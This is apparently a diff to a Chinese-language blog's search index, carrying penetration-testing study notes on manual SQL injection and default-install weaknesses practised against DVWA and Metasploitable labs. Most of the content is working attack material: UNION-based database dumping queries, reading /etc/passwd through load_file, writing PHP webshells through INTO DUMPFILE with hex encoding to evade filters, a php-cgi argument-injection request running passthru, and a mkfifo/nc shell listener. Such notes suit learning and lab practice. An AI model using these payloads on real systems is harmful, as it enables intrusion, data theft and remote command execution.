@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>手动漏洞挖掘-SQL注入、一</title>
+      <link href="/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/"/>
+      <url>/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/</url>
+      
+        <content type="html"><![CDATA[<h3 id="手动漏洞挖掘-SQL注入（一）"><a href="#手动漏洞挖掘-SQL注入（一）" class="headerlink" title="手动漏洞挖掘-SQL注入（一）"></a>手动漏洞挖掘-SQL注入（一）</h3><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul><li>基于报错的检测方法</li><li>’    ”    %    （）</li><li>基于布尔的检测<ul><li>1‘ and ‘1’=’1    /    1’ and ‘1</li><li>1’ and ‘1’=2    /    1’ and ‘0</li></ul></li><li>查询的信息有几列<ul><li>‘order by 9 – 知道列数后就可以联合查询</li></ul></li></ul><a id="more"></a><ul><li>联合查询<ul><li>‘ union select 1,2,3,4 – 观察前端返回的是查询到的第几个字段</li><li>可以把1,2,3,4替换成数据库的函数</li><li>‘ union all select database()</li></ul></li><li>一些常用的：<ul><li>’ union select database() ,substring_index(USER(),”@”,1)– <ul><li>把USER()执行的结果用@切分，显示第一段</li></ul></li><li>DB用户：user()</li><li>DB版本：version()</li><li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li><li>当前库：database()</li><li>ASCII转字符：char()</li><li>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li><li>MD5(‘b’)</li></ul></li></ul><h4 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h4><ul><li>MySQL数据查询（元数据的表 information_schema）<ul><li>查询有那些库，哪些表<ul><li>select table_name,tbale_schema from information_schema.tables    //数据库中有哪些库(table_schema)，哪些表(table_name)</li><li>select count(*),tbale_schema from information_schema.tables group by table_schema //看看一共有多少个表<ul><li>其中information_schema有17张表，如果想学mysql就学这17张表，很有价值，必须要学。</li></ul></li></ul></li><li>查询库中的表名<ul><li>select tablename,table_schema from information_schema.tables where table_schema= ‘dvwa’</li></ul></li><li>查询表中的列名<ul><li>select table_name,column_name from information_schema.columns where table_schema = ‘dvwa’ and table_name=’users’</li></ul></li><li>查询表中数据</li></ul></li></ul><h4 id="其它利用场景"><a href="#其它利用场景" class="headerlink" title="其它利用场景"></a>其它利用场景</h4><ul><li>读取文件<ul><li>select load_file(‘/etc/passwd’)</li></ul></li><li>写入文件<ul><li>select “&lt;?php passthru($_GET[‘cmd’]); ?&gt;” INTO DUMPFILE “/var/www/a.php”<ul><li>DUMPFILE后不加路径的话，默认位置在/var/lib/mysql/dvwa/a.php</li><li>语句中的符号可能会被过滤，可以尝试使用编码绕过，url编码，16进制编码。INTO DUMPFILE 函数会解码。<ul><li><code>cat reverse-shell.php|xxd -ps|tr -d &#39;\n&#39;</code><ul><li>xxd -ps 生成的二进制文件中会有换行符，需要用tr来去掉</li></ul></li><li>select (0x1111111111111) into dumpfile “/tmp/c.php”</li></ul></li></ul></li><li>写入到/tmp文件夹（777权限），然后include到页面中，include成为当前页面的一部分，而当前页面是有执行权限的</li></ul></li><li>保存下载数据库<ul><li>select select (0x1111111111111) into outfile “/tmp/a.db”</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>判断是否存在</li><li>判断是第几个字段</li><li>查询，利用</li></ol><ul><li><p>一个思路 ，编写服务器端的代码，实现比如插入一个用户名和密码。。</p></li><li><p>权限最小化，权限分离</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>手动漏洞挖掘-命令执行、目录遍历、文件包含、文件上传</title>
       <link href="/2020/10/15/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
       <url>/2020/10/15/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
@@ -32,10 +59,10 @@
     
     <entry>
       <title>手动漏洞挖掘-1.默认安装</title>
-      <link href="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
-      <url>/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</url>
+      <link href="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
+      <url>/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</url>
       
-        <content type="html"><![CDATA[<h3 id="手动漏洞挖掘-1-默认安装"><a href="#手动漏洞挖掘-1-默认安装" class="headerlink" title="手动漏洞挖掘-1.默认安装"></a>手动漏洞挖掘-1.默认安装</h3><ul><li><p>Windows默认安装漏洞</p></li><li><p>phpMyAdmin/setup</p><ul><li>MetaSploitable<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br><br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure><img src="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/pic1.png" alt></li></ul><a id="more"></a><ul><li>写入webshell</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo&quot;&lt;?php\$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot;&gt;&#x2F;var&#x2F;www&#x2F;3.php<br></code></pre></td></tr></table></figure><ul><li><p>PHP反弹shell</p><ul><li><code>/usr/share/webshells/php/php-reverse-shell.php</code></li><li>直接把内容用burp发送，然后在本地用nc侦听，记得修改php文件里面的ip地址</li></ul></li><li><p>侦听shell</p></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo system(&#39;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe|nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe&#39;);<br></code></pre></td></tr></table></figure><ul><li><p>File</p><ul><li>如果当前用户没有权限执行ifconfig，先用whereis 查看ifconfig的路径，然后到目录下使用./执行。</li></ul></li></ul><ul><li><p>Ubuntu/Debian默认安装PHP5-cgi</p></li><li><p>可直接访问/cgi-bin/php5和/cgi-bin/php(爬不出来的目录</p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路：先检查默认安装的软件是否有相关漏洞</p>]]></content>
+        <content type="html"><![CDATA[<h3 id="手动漏洞挖掘-默认安装"><a href="#手动漏洞挖掘-默认安装" class="headerlink" title="手动漏洞挖掘-默认安装"></a>手动漏洞挖掘-默认安装</h3><ul><li><p>Windows默认安装漏洞</p></li><li><p>phpMyAdmin/setup</p><ul><li>MetaSploitable<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br><br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure><img src="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/pic1.png" alt></li></ul><a id="more"></a><ul><li>写入webshell</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo&quot;&lt;?php\$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot;&gt;&#x2F;var&#x2F;www&#x2F;3.php<br></code></pre></td></tr></table></figure><ul><li><p>PHP反弹shell</p><ul><li><code>/usr/share/webshells/php/php-reverse-shell.php</code></li><li>直接把内容用burp发送，然后在本地用nc侦听，记得修改php文件里面的ip地址</li></ul></li><li><p>侦听shell</p></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo system(&#39;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe|nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe&#39;);<br></code></pre></td></tr></table></figure><ul><li><p>File</p><ul><li>如果当前用户没有权限执行ifconfig，先用whereis 查看ifconfig的路径，然后到目录下使用./执行。</li></ul></li></ul><ul><li><p>Ubuntu/Debian默认安装PHP5-cgi</p></li><li><p>可直接访问/cgi-bin/php5和/cgi-bin/php(爬不出来的目录</p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路：先检查默认安装的软件是否有相关漏洞</p>]]></content>
       
       
       <categories>
